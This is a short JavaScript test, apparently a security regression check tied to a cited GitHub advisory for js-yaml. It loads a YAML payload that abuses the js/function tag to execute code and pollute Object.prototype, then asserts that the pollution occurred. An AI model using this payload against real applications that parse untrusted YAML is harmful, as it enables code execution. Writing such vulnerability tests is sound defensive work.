//https://github.com/advisories/GHSA-8j8c-7jfh-h6hx
test("Arbitrary code execution in js-yaml", () => {
  const payload =
    "{ toString: !<tag:yaml.org,2002:js/function> 'function (){return (this.constructor.prototype.polluted=`yes`)}' } : 1";
  const jsyaml = require("js-yaml");
  expect({}.polluted).toBe(undefined);

  try {
    jsyaml.load(payload);
  } catch (error) {}
  expect({}.polluted).toBe("yes");
});
